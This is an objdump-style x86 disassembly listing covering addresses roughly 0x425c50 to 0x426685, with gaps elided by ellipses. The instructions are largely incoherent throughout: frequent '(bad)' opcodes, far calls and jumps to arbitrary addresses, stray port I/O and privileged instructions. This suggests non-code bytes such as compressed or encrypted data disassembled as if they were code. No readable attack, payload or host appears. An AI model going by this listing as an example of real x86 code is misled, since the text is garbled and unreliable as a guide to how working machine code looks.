  425c50:	fiadd  WORD PTR [ebx+0x7d]
  425c53:	sar    BYTE PTR [esi],cl
  425c55:	push   ss
  425c56:	cmp    DWORD PTR [ebx*8-0x1fbb943],0xffffffd6
  425c5e:	and    BYTE PTR [edx-0x665ee367],bh
  425c64:	jmp    0x673c2d02
  425c69:	(bad)  
  425c6a:	adc    dl,BYTE PTR [esi+0x5294ebf6]
  425c70:	mov    ch,0xc5
  425c72:	cmp    eax,0x3bf58d5c
  425c77:	enter  0x7b65,0x95
  425c7b:	cmp    al,0x9f
  425c7d:	sub    al,0xd7
  425c7f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  425c81:	(bad)  
  425c82:	jg     0x425c61
  425c84:	pop    ebx
  425c85:	std    
  425c86:	mov    esp,0x4467ed8
  425c8b:	mov    eax,ds:0x2a6d94b4
  425c90:	pop    ds
  425c91:	inc    edx
  425c92:	lahf   
  425c93:	out    0xbe,al
  425c95:	aas    
  425c96:	jecxz  0x425cbc
  425c98:	retf   0x30c5
  425c9b:	imul   eax,DWORD PTR [eax],0x2a
  425c9e:	loope  0x425c46
  425ca0:	mov    edx,0xa12ca1e3
  425ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca6:	cmp    al,0x97
  425ca8:	adc    al,0xd3
  425caa:	repnz cdq 
  425cac:	dec    ebp
  425cad:	test   dl,dl
  425caf:	or     DWORD PTR [edx],0x2c
  425cb2:	(bad)  
  425cb4:	nop
	...
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x5d
  425d23:	pop    ecx
  425d24:	xchg   DWORD PTR [ebx],esp
  425d26:	es xchg ebx,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    BYTE PTR [edi],al
  425d2f:	add    bh,BYTE PTR [esi-0x28087bd0]
  425d35:	cwde   
  425d36:	jge    0x425d8a
  425d38:	xchg   edx,eax
  425d39:	jmp    0x48cc42e5
  425d3e:	imul   ebx,eax,0xb49bade6
  425d44:	(bad)  
  425d45:	mov    esi,0x8de96920
  425d4a:	stc    
  425d4b:	pop    esi
  425d4c:	or     al,cl
  425d4e:	xor    DWORD PTR [eax-0xe],eax
  425d51:	jp     0x425d15
  425d53:	mov    eax,DWORD PTR [eax+0x51]
  425d56:	(bad)
  425d59:	mov    BYTE PTR [eax],al
  425d5b:	pop    ebx
  425d5c:	sub    eax,DWORD PTR [edx+esi*4-0x49]
  425d60:	sbb    BYTE PTR ds:0xf521a9da,cl
  425d66:	sub    DWORD PTR [ebx],edi
  425d68:	ret    
  425d69:	xor    DWORD PTR [edx],eax
  425d6b:	leave  
  425d6c:	sbb    bh,dh
  425d6e:	push   edi
  425d6f:	add    edx,DWORD PTR [eax+0x24cd4fd4]
  425d75:	pop    ecx
  425d76:	sbb    ah,al
  425d78:	ins    DWORD PTR es:[edi],dx
  425d79:	lods   eax,DWORD PTR ds:[esi]
  425d7a:	mov    BYTE PTR [esi-0x72],0xf8
  425d7e:	xchg   edx,eax
  425d7f:	mov    ?,WORD PTR [esi+eiz*4-0x6f929d66]
  425d86:	aas    
  425d87:	loop   0x425d80
  425d89:	jg     0x425d8a
  425d8b:	imul   ecx,ecx,0x2e2b2d74
  425d91:	inc    esi
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	loope  0x425d19
  425d95:	ins    DWORD PTR es:[edi],dx
  425d96:	das    
  425d97:	xchg   edx,eax
  425d98:	out    0x79,al
  425d9a:	mov    al,0x3f
  425d9c:	inc    edx
  425d9d:	ss cmp eax,0x14152a25
  425da3:	js     0x425df5
  425da5:	adc    DWORD PTR [ebp+0x62637178],ebx
  425dab:	aaa    
  425dac:	push   esi
  425dad:	xchg   ebx,eax
  425dae:	or     DWORD PTR [ebp-0x6e],eax
  425db1:	cmc    
  425db2:	mov    eax,0x7d118634
  425db7:	adc    eax,DWORD PTR [eax+0x74]
  425dba:	adc    ebp,DWORD PTR [edi-0x78]
  425dbd:	adc    bl,BYTE PTR [edi]
  425dbf:	je     0x425dcb
  425dc1:	pop    ebx
  425dc2:	adc    DWORD PTR [ecx],ebp
  425dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dc5:	pusha  
  425dc6:	mov    bl,0xc7
  425dc8:	test   BYTE PTR [bx],0xa2
  425dcc:	(bad)  
  425dcd:	inc    edi
  425dce:	les    esi,FWORD PTR ds:0x84809f81
  425dd4:	xchg   edi,eax
  425dd5:	mov    ebx,0x94372171
  425dda:	cmp    eax,0x17e46911
  425ddf:	mov    bl,0x2
  425de1:	mov    ds:0x325555b9,eax
  425de6:	leave  
  425de7:	jg     0x425e64
  425de9:	jne    0x425dac
  425deb:	xchg   esi,eax
  425dec:	inc    ecx
  425ded:	loopne 0x425d80
  425def:	push   ecx
  425df0:	aaa    
  425df1:	lods   eax,DWORD PTR ds:[esi]
  425df2:	pop    eax
  425df3:	mov    dh,0x30
  425df5:	mov    bh,0x3f
  425df7:	pop    ebp
  425df8:	stos   DWORD PTR es:[edi],eax
  425df9:	call   FWORD PTR [edx+edx*4-0x60f1715f]
  425e00:	fidivr WORD PTR ds:0x11454712
  425e06:	jmp    0x425e19
  425e08:	sbb    esi,esi
  425e0a:	push   ecx
  425e0b:	cmp    dh,al
  425e0d:	cwde   
  425e0e:	shl    dh,cl
  425e10:	xchg   ecx,eax
  425e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e12:	outs   dx,DWORD PTR ds:[esi]
  425e13:	push   ebp
  425e14:	out    0x8c,eax
  425e16:	mov    DWORD PTR [ebp-0x374751cd],eax
  425e1c:	jmp    0x425e36
  425e1e:	mov    ds:0xba0c1e33,al
  425e23:	adc    dh,BYTE PTR [esi-0x1f0edd7c]
  425e29:	mov    esi,0xca3d71cf
  425e2e:	scas   eax,DWORD PTR es:[edi]
  425e2f:	jecxz  0x425e82
  425e31:	rcr    BYTE PTR [edi+0x8c2],cl
	...
  425e93:	add    BYTE PTR [eax],al
  425e95:	add    dh,al
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	out    0xec,eax
  425ea4:	push   edi
  425ea5:	call   0x107:0x1942d
  425eac:	add    BYTE PTR [eax],al
  425eae:	lea    edx,[eax+0x45]
  425eb1:	pop    edx
  425eb2:	sbb    al,0x56
  425eb4:	(bad)  
  425eb5:	ds or  al,ah
  425eb8:	bndldx bnd0,[ebp-0x24075be8]
  425ebf:	pop    ebx
  425ec0:	mov    cl,0x19
  425ec2:	shl    BYTE PTR [esi],cl
  425ec4:	sbb    bl,dh
  425ec6:	mov    dl,0x34
  425ec8:	std    
  425ec9:	add    al,0xb
  425ecb:	stos   DWORD PTR es:[di],eax
  425ecd:	dec    eax
  425ece:	mov    al,0x57
  425ed0:	arpl   WORD PTR cs:[ebx-0x7dbd76db],sp
  425ed7:	sar    esp,0xe7
  425eda:	pop    ss
  425edb:	mov    esi,0x7c0545ee
  425ee0:	gs addr16 pop edi
  425ee3:	add    eax,0x68062b6c
  425ee8:	sbb    al,0xac
  425eea:	test   al,0x33
  425eec:	fiadd  DWORD PTR [ecx-0x1df05329]
  425ef2:	js     0x425f19
  425ef4:	rcr    bh,cl
  425ef6:	inc    eax
  425ef7:	mov    esp,0xa039dd4b
  425efc:	or     edi,DWORD PTR [ebx+edx*8-0x7445566b]
  425f03:	imul   eax,DWORD PTR [ecx],0xffffff9d
  425f06:	cwde   
  425f07:	mov    al,0xfc
  425f09:	out    dx,al
  425f0a:	pop    ds
  425f0b:	cmp    DWORD PTR [ebx+0x7],esi
  425f0e:	mov    ebp,0xb94f0e2b
  425f13:	iret   
  425f14:	or     BYTE PTR [esi-0x13],cl
  425f17:	fiadd  DWORD PTR [eax]
  425f19:	stos   DWORD PTR es:[edi],eax
  425f1a:	jno    0x425f79
  425f1c:	frndint 
  425f1e:	stos   BYTE PTR es:[edi],al
  425f1f:	ins    DWORD PTR es:[edi],dx
  425f20:	xor    cl,ah
  425f22:	pop    ebx
  425f23:	dec    edi
  425f24:	in     al,dx
  425f25:	(bad)  
  425f27:	in     al,0x71
  425f29:	retf   
  425f2a:	mov    al,ds:0x145ca5fc
  425f2f:	ins    DWORD PTR es:[edi],dx
  425f30:	or     BYTE PTR [edx-0x7e],ch
  425f33:	(bad)  
  425f34:	call   0xaa17:0xf0980153
  425f3b:	cmc    
  425f3c:	dec    esi
  425f3d:	mov    al,ds:0xc6273de6
  425f42:	xor    cl,BYTE PTR [eax+ecx*2+0x75]
  425f46:	(bad)  
  425f47:	ins    DWORD PTR es:[edi],dx
  425f48:	sbb    eax,DWORD PTR [eax-0x77856863]
  425f4e:	dec    ebx
  425f4f:	push   es
  425f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f51:	push   ss
  425f52:	icebp  
  425f53:	leave  
  425f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f55:	push   es
  425f56:	pusha  
  425f57:	mov    DWORD PTR [ecx+edi*2+0x6e411bbd],ebp
  425f5e:	mov    ah,BYTE PTR [edx+0x72f03e0a]
  425f64:	test   al,0x4b
  425f66:	retf   
  425f67:	cmp    DWORD PTR [eax-0x7ee56325],esp
  425f6d:	mov    bl,0xf1
  425f6f:	dec    ebp
  425f70:	les    edi,FWORD PTR [edi+0x40df096b]
  425f76:	and    ecx,esp
  425f78:	pusha  
  425f79:	lods   al,BYTE PTR ds:[esi]
  425f7a:	loop   0x425f1a
  425f7c:	ja     0x425f02
  425f7e:	jg     0x425ff9
  425f80:	repz scas al,BYTE PTR es:[edi]
  425f82:	sub    eax,0x8d7373a7
  425f87:	mov    ecx,0x303a690f
  425f8c:	xchg   edx,eax
  425f8d:	add    al,0x6
  425f8f:	or     BYTE PTR [ebx+0x12827e9f],dh
  425f95:	stc    
  425f96:	pop    eax
  425f97:	push   ebp
  425f98:	btc    DWORD PTR [eax-0x2bb73316],ebp
  425f9f:	sbb    edx,DWORD PTR [eax+0xf]
  425fa2:	sub    esp,DWORD PTR gs:[edi-0x41]
  425fa6:	pushf  
  425fa7:	fisub  WORD PTR [ecx]
  425fa9:	pop    edx
  425faa:	psrad  mm0,QWORD PTR [edi]
  425fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fae:	dec    edi
  425faf:	popf   
  425fb0:	(bad)  [ebx]
  425fb2:	mov    DWORD PTR [eax+0x21],esp
	...
  426014:	add    BYTE PTR [eax],al
  426016:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0xa20bb490
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [edx+eax*2],al
  426030:	sub    eax,0x3091d45e
  426035:	das    
  426036:	dec    ebx
  426037:	ret    
  426038:	or     ecx,ecx
  42603a:	xor    bl,BYTE PTR ds:0xf1c74223
  426040:	push   0x1e
  426042:	jb     0x426095
  426044:	repz fidiv WORD PTR ds:0x7d4788c2
  42604b:	(bad)  
  42604d:	frstor [ebx]
  42604f:	pop    esi
  426050:	or     dl,dh
  426052:	xor    BYTE PTR ds:0xcb466aa2,bh
  426058:	inc    ecx
  426059:	jbe    0x42608d
  42605b:	adc    BYTE PTR [eax-0x51f6c425],dh
  426061:	inc    esi
  426062:	pushf  
  426063:	sbb    DWORD PTR [eax+0x2807282b],eax
  426069:	stc    
  42606a:	jb     0x4260b2
  42606c:	gs push 0x1a466091
  426072:	adc    eax,DWORD PTR [ebp-0x5ceba3d9]
  426078:	add    al,0xbc
  42607a:	mov    edx,DWORD PTR [edx]
  42607c:	xchg   BYTE PTR [ecx+0x34a4a33b],dl
  426082:	int3   
  426083:	ror    BYTE PTR [edi*8+0x61b4b0be],cl
  42608a:	retf   0x65fa
  42608d:	add    ebp,ebx
  42608f:	sub    BYTE PTR [ebp+0x32],bh
  426092:	xchg   esi,eax
  426093:	sbb    esp,DWORD PTR fs:[ebp+0x2a42516a]
  42609a:	retf   
  42609b:	repnz inc esp
  42609d:	out    0x6b,al
  42609f:	in     eax,dx
  4260a0:	out    0x38,al
  4260a2:	inc    ebp
  4260a3:	xor    eax,DWORD PTR [ebp-0x12]
  4260a6:	inc    ebx
  4260a7:	jl     0x4260ff
  4260a9:	fdiv   QWORD PTR [eax-0x4a]
  4260ac:	jno    0x4260b5
  4260ae:	cs js  0x426054
  4260b1:	pop    eax
  4260b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260b3:	out    dx,eax
  4260b4:	mov    esi,DWORD PTR [edi+0x79]
  4260b7:	aas    
  4260b8:	fbstp  TBYTE PTR [esi]
  4260ba:	push   esp
  4260bb:	inc    ebx
  4260bc:	shl    DWORD PTR [ebx+eiz*8-0xb898e16],1
  4260c3:	imul   ebp,DWORD PTR [edi],0x21933bb6
  4260c9:	in     al,0xed
  4260cb:	cmp    DWORD PTR [ecx],ecx
  4260cd:	mov    dl,bh
  4260cf:	mov    ds:0x61ae022c,al
  4260d4:	jne    0x4260c5
  4260d6:	fstp   TBYTE PTR [edi-0x48561543]
  4260dc:	xchg   ebx,eax
  4260dd:	ret    0xf2a7
  4260e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260e1:	outs   dx,DWORD PTR ds:[esi]
  4260e2:	xchg   BYTE PTR [edx],dl
  4260e4:	push   0xffffffb0
  4260e6:	je     0x426139
  4260e8:	mov    ch,0x64
  4260ea:	icebp  
  4260eb:	lahf   
  4260ec:	jbe    0x426122
  4260ee:	(bad)  
  4260f0:	xchg   ebp,ebx
  4260f2:	or     al,0xfb
  4260f4:	sbb    ecx,eax
  4260f6:	cmp    DWORD PTR [eax],0x72a9a9c4
  4260fc:	test   eax,0xc9bdea87
  426101:	push   ss
  426102:	shl    BYTE PTR [ebp-0x79],1
  426105:	add    eax,0xece12c30
  42610a:	dec    DWORD PTR ss:[ebx]
  42610d:	xchg   edi,eax
  42610e:	or     esi,esp
  426110:	daa    
  426111:	lahf   
  426112:	and    ebp,edx
  426114:	loop   0x42615a
  426116:	jns    0x42610b
  426118:	data16 mov WORD PTR [edi],cs
  42611b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42611c:	or     ah,BYTE PTR ds:0xdf918631
  426122:	sub    BYTE PTR [edx],bh
  426124:	sbb    al,0x3f
  426126:	push   es
  426127:	test   al,0x50
  426129:	inc    DWORD PTR [edi-0x505ed490]
  42612f:	add    eax,0x7668fe32
  426134:	pop    esp
	...
  426195:	add    BYTE PTR [ebx-0x409ef0df],bl
  42619b:	outs   dx,DWORD PTR ds:[esi]
  42619c:	(bad)  
  42619d:	sti    
  42619e:	outs   dx,DWORD PTR ds:[esi]
  42619f:	sub    BYTE PTR [ebx+0x2a834383],bh
  4261a5:	pop    ecx
  4261a6:	cmp    edx,DWORD PTR [esi+0x1070001]
  4261ac:	add    BYTE PTR [eax],al
  4261ae:	js     0x42614c
  4261b0:	daa    
  4261b1:	dec    BYTE PTR [ebx+0x5f236941]
  4261b7:	dec    esp
  4261b8:	dec    edi
  4261b9:	sub    ecx,eax
  4261bb:	xchg   ecx,eax
  4261bc:	mov    ah,0x70
  4261be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261bf:	ret    
  4261c0:	repz pop ss
  4261c2:	out    0x7d,eax
  4261c4:	sub    BYTE PTR [eax+0x63938a53],ah
  4261ca:	jp     0x42615b
  4261cc:	sbb    ebp,0xffffffaa
  4261cf:	pop    edx
  4261d0:	test   eax,0x72eff61a
  4261d5:	bnd ds jle 0x426187
  4261d9:	add    al,0xc1
  4261db:	aas    
  4261dc:	fnstenv ds:0x60cb41d6
  4261e2:	mov    dl,0x9c
  4261e4:	mov    esi,DWORD PTR [ebx-0x72]
  4261e7:	(bad)  
  4261e8:	fbstp  TBYTE PTR [ebp+0x2cc1f19e]
  4261ee:	imul   ebx,DWORD PTR [ebx],0x44
  4261f1:	push   cs
  4261f2:	ret    
  4261f3:	mov    ebx,gs
  4261f5:	xchg   ecx,eax
  4261f6:	pop    esi
  4261f7:	and    dl,BYTE PTR es:0xe8c35c10
  4261fe:	pmaddwd mm3,QWORD PTR [ecx]
  426201:	mov    bl,0x68
  426203:	or     DWORD PTR [edx-0x62],ebx
  426206:	je     0x426215
  426208:	int3   
  426209:	push   es
  42620a:	sbb    eax,0xf03a2e1
  42620f:	cmc    
  426210:	jmp    0xdd1e:0xc350ba7c
  426217:	loopne 0x426270
  426219:	idiv   ebp
  42621b:	adc    dl,BYTE PTR [edx]
  42621d:	std    
  42621e:	and    DWORD PTR [ecx+eax*8-0x7e53feb3],esi
  426225:	(bad)  
  426227:	(bad)  
  426228:	pop    ebx
  426229:	xor    ah,cl
  42622b:	jae    0x4261c5
  42622d:	sub    BYTE PTR [ecx+0x50500ab4],dh
  426233:	inc    esi
  426234:	sahf   
  426235:	and    DWORD PTR [ebx],eax
  426237:	outs   dx,DWORD PTR ds:[esi]
  426238:	fwait
  426239:	xchg   BYTE PTR [edi+esi*4+0x10c433d3],dh
  426240:	(bad)  [edi]
  426242:	push   ecx
  426243:	mov    ds:0xb6d1a2c1,eax
  426248:	or     ch,BYTE PTR [eax+0x1f]
  42624b:	ret    0xa8cd
  42624e:	mov    ah,0xfd
  426250:	mov    bl,BYTE PTR [edi+0x5c]
  426253:	push   edx
  426255:	fbld   TBYTE PTR [edx+0x10]
  426258:	sti    
  426259:	sbb    esi,edi
  42625b:	lahf   
  42625c:	or     al,0x14
  42625e:	enter  0x93eb,0x60
  426262:	xchg   ecx,eax
  426263:	jno    0x426282
  426265:	jo     0x426221
  426267:	adc    eax,edx
  426269:	dec    esp
  42626a:	jno    0x4262a8
  42626c:	xor    DWORD PTR [esi-0x2d6d8e4],esi
  426272:	sbb    bl,dh
  426274:	xlat   BYTE PTR ds:[ebx]
  426275:	xchg   ebx,eax
  426276:	lods   al,BYTE PTR ds:[esi]
  426277:	jmp    0xc653869
  42627c:	fild   DWORD PTR [esi-0x22]
  42627f:	cmp    DWORD PTR [ecx],0x6b04e395
  426285:	in     al,0x45
  426287:	xchg   edx,eax
  426288:	mov    esp,0xea80f12b
  42628d:	push   cs
  42628e:	mov    al,dl
  426290:	cli    
  426291:	sub    ebp,DWORD PTR [eax]
  426293:	mov    eax,ds:0x1ed31613
  426298:	jo     0x4262ec
  42629a:	ss scas eax,DWORD PTR es:[edi]
  42629c:	xchg   edx,eax
  42629d:	push   esp
  42629e:	retf   
  42629f:	add    BYTE PTR [edi+0x60b323c],bh
  4262a5:	sub    BYTE PTR ds:[edx],bl
  4262a8:	xor    eax,0xbb559115
  4262ad:	test   eax,0x9114ede9
  4262b2:	test   BYTE PTR ds:[ebp+0x0],0x0
	...
  426313:	add    BYTE PTR [eax],al
  426315:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426319:	dec    esi
  42631a:	std    
  42631b:	out    dx,al
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x9354
  426323:	xchg   ecx,eax
  426324:	or     al,0x94
  426326:	inc    edx
  426327:	xchg   edi,eax
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    al,dl
  42632f:	push   0xffffff85
  426331:	leave  
  426332:	hlt    
  426333:	or     eax,0xe425132c
  426338:	rcl    DWORD PTR [ebx+0x71],1
  42633b:	pop    esp
  42633c:	loop   0x426364
  42633e:	sbb    BYTE PTR [eax-0x3d],dh
  426341:	adc    al,0xa9
  426343:	push   cs
  426344:	mov    DWORD PTR ds:0x9aa7492f,ebx
  42634a:	push   ds
  42634b:	icebp  
  42634c:	mov    ecx,0x9a9c2d81
  426351:	xchg   esp,eax
  426352:	mov    ah,0xec
  426354:	shl    DWORD PTR [ecx+0x26],0xad
  426358:	stc    
  426359:	cmp    al,0x98
  42635b:	and    eax,0x54359eed
  426360:	(bad)  
  426361:	pop    ebp
  426362:	jmp    FWORD PTR [ecx+eax*2-0xd]
  426366:	and    eax,0xeb41bf1c
  42636b:	iret   
  42636c:	jg     0x4263c8
  42636e:	inc    edx
  42636f:	push   edx
  426370:	adc    ebp,ebp
  426372:	sar    DWORD PTR ds:0x5a8e9f7e,1
  426378:	rcr    BYTE PTR [ecx-0x1e],1
  42637b:	pop    esi
  42637c:	fild   QWORD PTR [edx+esi*8+0x78]
  426380:	sbb    eax,0x9d274bec
  426385:	loop   0x426351
  426387:	or     esp,DWORD PTR [edx]
  426389:	cmp    DWORD PTR [esi+ecx*4+0x1b129950],eax
  426390:	sub    eax,ecx
  426392:	imul   esi,DWORD PTR [ebx],0xf4b094cf
  426398:	int3   
  426399:	dec    ebp
  42639a:	gs push ebx
  42639c:	add    DWORD PTR [eax],ebp
  42639e:	stos   DWORD PTR es:[edi],eax
  42639f:	cmp    ebp,DWORD PTR [ecx+0x19]
  4263a2:	dec    DWORD PTR [edi-0x7b]
  4263a5:	or     dh,ah
  4263a7:	je     0x426331
  4263a9:	xchg   esp,eax
  4263aa:	jecxz  0x4263b6
  4263ac:	and    eax,0x1fd442ec
  4263b1:	and    esi,edx
  4263b3:	scas   al,BYTE PTR es:[edi]
  4263b4:	lods   eax,DWORD PTR ds:[esi]
  4263b5:	repz pop esi
  4263b7:	int    0x6a
  4263b9:	aaa    
  4263ba:	and    ebp,edx
  4263bc:	(bad)  
  4263bd:	cmp    DWORD PTR ds:0x276d447a,edx
  4263c3:	cmp    cl,BYTE PTR [edi]
  4263c5:	in     al,dx
  4263c6:	or     eax,0x6deb7f89
  4263cb:	jg     0x426440
  4263cd:	or     eax,0x9d53b698
  4263d2:	leave  
  4263d3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263d5:	sbb    al,0x1b
  4263d7:	adc    eax,0xefeeaee3
  4263dc:	dec    eax
  4263dd:	mov    dh,0xd2
  4263df:	sub    eax,ebp
  4263e1:	shr    BYTE PTR [eax-0x5496d934],1
  4263e7:	and    al,cl
  4263e9:	mov    edi,ebx
  4263eb:	out    0x7c,eax
  4263ed:	dec    esp
  4263ee:	pop    es
  4263ef:	pop    edi
  4263f0:	in     al,0x68
  4263f2:	cmp    DWORD PTR [edi+0x6dbdaf95],edi
  4263f8:	iret   
  4263f9:	js     0x4263a3
  4263fb:	xchg   ebp,eax
  4263fc:	and    BYTE PTR [edi+0x63e747c],bl
  426402:	push   esi
  426403:	jp     0x42641c
  426405:	adc    dh,BYTE PTR [eax-0x1914d249]
  42640b:	int    0xf6
  42640d:	fnstenv [ebp-0x45]
  426410:	adc    DWORD PTR [edi+0x38],edx
  426413:	frstor [edi-0x78218dcb]
  426419:	jnp    0x4263d3
  42641b:	scas   al,BYTE PTR es:[edi]
  42641c:	mov    cl,0xee
  42641e:	es out dx,al
  426420:	lds    edi,FWORD PTR [eax]
  426422:	push   esi
  426423:	aas    
  426424:	add    al,0xd8
  426426:	mov    eax,ds:0x7998f39b
  42642b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42642c:	rol    edi,cl
  42642e:	fwait
  42642f:	dec    edi
  426430:	je     0x4263fc
  426432:	sbb    BYTE PTR [esp+ecx*8+0x0],cl
	...
  426495:	add    BYTE PTR [ecx+0x6f],ch
  426498:	mov    BYTE PTR [eax],cl
  42649a:	mov    gs,edi
  42649c:	jmp    0x7b21f210
  4264a1:	dec    esp
  4264a2:	mov    esp,0x4969ad15
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    BYTE PTR [esi],bh
  4264af:	js     0x426513
  4264b1:	cmp    al,0xb2
  4264b3:	xor    BYTE PTR [esi+edi*1+0x13406a29],bh
  4264ba:	hlt    
  4264bb:	sub    dh,dl
  4264bd:	int3   
  4264be:	and    BYTE PTR [ecx+eiz*1],al
  4264c1:	dec    ecx
  4264c2:	fmul   DWORD PTR [esi+0x52]
  4264c5:	(bad)  
  4264c6:	sub    eax,0xb33e6d8b
  4264cb:	inc    ebx
  4264cc:	jp     0x42652a
  4264ce:	adc    al,0x64
  4264d0:	pushf  
  4264d1:	out    dx,eax
  4264d2:	inc    ebx
  4264d3:	hlt    
  4264d4:	push   es
  4264d5:	imul   esi,DWORD PTR [ebp-0x220b1c6b],0xdfb1705c
  4264df:	jmp    0x426476
  4264e1:	pusha  
  4264e2:	fs and ebx,ebx
  4264e5:	ins    DWORD PTR es:[edi],dx
  4264e6:	pusha  
  4264e7:	mov    ds:0xdb50b735,eax
  4264ec:	popw   es
  4264ee:	std    
  4264ef:	fimul  WORD PTR [eax+0x419aad1b]
  4264f5:	std    
  4264f6:	dec    edi
  4264f7:	mov    ds:0x6902570e,eax
  4264fc:	xor    eax,0xf1648367
  426501:	sub    esp,DWORD PTR [edi]
  426503:	mov    ebx,0x2962057e
  426508:	push   0xffffffc3
  42650a:	lahf   
  42650b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42650c:	sub    DWORD PTR [eax],eax
  42650e:	in     eax,dx
  42650f:	add    esi,DWORD PTR [edx]
  426511:	retf   0xf26a
  426514:	stos   BYTE PTR es:[edi],al
  426515:	(bad)  
  426516:	shl    DWORD PTR [ebp-0x27],cl
  426519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42651a:	pop    ecx
  42651b:	in     al,dx
  42651c:	stos   DWORD PTR es:[edi],eax
  42651d:	out    dx,al
  42651e:	sbb    DWORD PTR [edi-0x46336e9e],eax
  426524:	(bad)  
  426525:	adc    ah,dh
  426527:	push   eax
  426528:	out    0x37,al
  42652a:	jbe    0x426520
  42652c:	fnsave [edx-0x992178f]
  426532:	ret    0xb3a4
  426535:	nop
  426536:	lods   eax,DWORD PTR ss:[esi]
  426538:	shr    cl,cl
  42653a:	fistp  QWORD PTR [ecx]
  42653c:	cmp    BYTE PTR [ebp+0x7282c5ee],al
  426542:	dec    esp
  426543:	retf   0xcfbb
  426546:	jge    0x426509
  426548:	(bad)  
  426549:	mov    edi,0x9664e380
  42654e:	dec    ecx
  42654f:	adc    esp,DWORD PTR ds:0x2e403233
  426555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426556:	mov    eax,0xdfaefc08
  42655b:	push   0x65
  42655d:	idiv   al
  42655f:	and    BYTE PTR [ebx+0xc84d448],ah
  426565:	outs   dx,DWORD PTR ds:[esi]
  426566:	sub    ecx,ebp
  426568:	pop    ds
  426569:	mov    dh,0xec
  42656b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42656c:	pop    ds
  42656d:	in     al,0xfd
  42656f:	jmp    0x2b6ae5e0
  426574:	lahf   
  426575:	jmp    0x42650c
  426577:	ror    DWORD PTR [edi+eax*1+0x66],0x27
  42657c:	and    DWORD PTR [eax+0x6ab9ed71],0x19
  426583:	add    al,0xc6
  426585:	inc    eax
  426586:	outs   dx,DWORD PTR ds:[esi]
  426587:	jo     0x426570
  426589:	pop    ecx
  42658a:	cmp    ebx,DWORD PTR [ebx-0x63]
  42658d:	push   ebx
  42658e:	push   0x2eb4f29
  426593:	xchg   edx,eax
  426594:	aad    0x97
  426596:	mov    ?,WORD PTR [ebx+0x6]
  426599:	rol    ch,1
  42659b:	xlat   BYTE PTR ds:[ebx]
  42659c:	out    dx,al
  42659d:	sbb    bh,BYTE PTR [esi+0x4bdbe3fe]
  4265a3:	gs js  0x4265ee
  4265a6:	ret    
  4265a7:	ja     0x426578
  4265a9:	lock or eax,0x652fcdcb
  4265af:	ja     0x4265f6
  4265b1:	jbe    0x42659b
  4265b3:	xchg   esi,eax
  4265b4:	jp     0x4265b6
	...
  426616:	adc    cl,bl
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	out    0xca,al
  426624:	push   ebp
  426625:	mov    eax,ds:0x19950
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [eax+0x6f25ea4e],ch
  426633:	mov    ebp,0x61893af8
  426638:	cdq    
  426639:	sub    al,0xa3
  42663c:	lahf   
  42663d:	cli    
  42663e:	xchg   ecx,eax
  42663f:	or     ebp,DWORD PTR [esi+ebx*2]
  426642:	sahf   
  426643:	jmp    0x42668a
  426645:	xor    al,0xe8
  426647:	push   0x861d833f
  42664c:	adc    al,0x71
  42664e:	in     al,0x6f
  426650:	loop   0x4265dc
  426652:	or     cl,ch
  426654:	out    0x4d,eax
  426656:	mov    BYTE PTR [ebx-0x170737cf],dh
  42665c:	push   ds
  42665d:	(bad)  
  42665e:	das    
  42665f:	adc    dl,BYTE PTR [eax+0xdac9666]
  426665:	lods   eax,DWORD PTR ds:[esi]
  426666:	cli    
  426667:	mov    ss,WORD PTR [eax]
  426669:	gs jno 0x426661
  42666c:	int3   
  42666d:	adc    edx,esi
  42666f:	sub    bl,dh
  426671:	jns    0x426651
  426673:	fld    QWORD PTR [ecx-0x65]
  426676:	cmp    eax,0x28b1be
  42667b:	pop    eax
  42667c:	sub    BYTE PTR [eax+0x4a],dl
  42667f:	add    bh,ch
  426681:	push   cs
  426682:	pop    es
  426683:	sbb    edx,esi
  426685:	loop   0x42661b
